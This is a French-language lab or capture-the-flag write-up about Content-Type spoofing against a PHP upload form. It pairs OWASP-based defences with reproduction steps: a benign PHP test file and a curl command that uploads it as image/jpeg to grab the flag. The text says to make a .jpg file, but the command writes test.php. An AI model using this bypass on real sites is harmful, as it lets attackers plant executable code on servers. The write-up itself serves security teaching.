# Content-Type Spoofing and malicious File Upload


## URL

`/index.php?page=upload`

## Description

Technique d'attaque où un attaquant manipule le Content-Type d'une requête HTTP envoyée via l'outil cURL (ou d'autres outils similaires) pour tromper le serveur ou l'application cible.

Lorsqu'un client envoie une requête HTTP (par exemple, pour télécharger un fichier ou soumettre un formulaire), il peut spécifier un en-tête `Content-Type pour` indiquer le type de données qu'il envoie (comme `application/json`, `multipart/form-data`, `text/plain`, etc.).

Le Content-Type Spoofing se produit lorsque l'attaquant modifie cet en-tête pour le faire correspondre à un type de contenu que le serveur attend, alors qu'en réalité, le corps de la requête contient des données d'un autre type. Par exemple, l'attaquant pourrait essayer de soumettre un fichier malveillant en manipulant le `Content-Type` pour qu'il soit vu comme une image (comme `image/png` ou `image/jpeg`), alors que le contenu réel du fichier pourrait être un script PHP ou un autre code malveillant.

Sur notre site :
Seuls les fichiers .jpg et .jpeg sont autorisés.
L'application vérifie les extensions, pas le contenu.
Le fichier ne doit juste pas être vide.



## Se protéger

- Avoir une liste des extensions autorisées
- Valider le type de fichier, ne pas juste faire confiance au header Content-Type, qui pourrait être falsifié (*spoofed*). Analyser le fichier avec sa signature MIME ou son contenu binaire avec `finfo_file()` en PHP.
- Générer un nouveau nom de fichier avant de le stocker sur le serveur.
- Appliquer une limite de taille sur les fichiers uploadés.
- Appliquer une limite de caractères au nom du fichier.
- Limiter les utilisateurs ayant droit d'uploader.
- Stocker les fichiers reçus sur un autre serveur, les déplacer.
- Scanner le fichier avec un anti-virus
- Exécuter le fichier dans un outil de scan CDR (Content Disarm & Reconstruct) s'il s'agit d'un PDF, DOCX...
- Si utilisation de librairie : bien les maintenir à jour et vérifier leur authenticité

[Source OWASP Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/File_Upload_Cheat_Sheet.html)

## Reproduire la faille

Seuls les fichiers .jpg et .jpeg sont autorisés.
L'application vérifie les extensions, pas le contenu.
Le fichier ne doit juste pas être vide.

Créer un fichier avec l'extension .jpg et y écrire du PHP tout simple :
```shell
echo '<?php echo "Ah, ça fonctionne ?"; ?>' > test.php
```

Et pourquoi pas passer par du curl pour uploader notre fichier et récupérer le flag dans la réponse du serveur :
```shell
curl "http://<IP_ADDRESS>/index.php?page=upload" \
  -F "Upload=Upload" \
  -F "uploaded=@test.php;type=image/jpeg" \
  -F "MAX_FILE_SIZE=100000" | grep "flag"
```

**Preuve que nous ne devons pas croire aveuglément les headers des requêtes HTTP reçus.**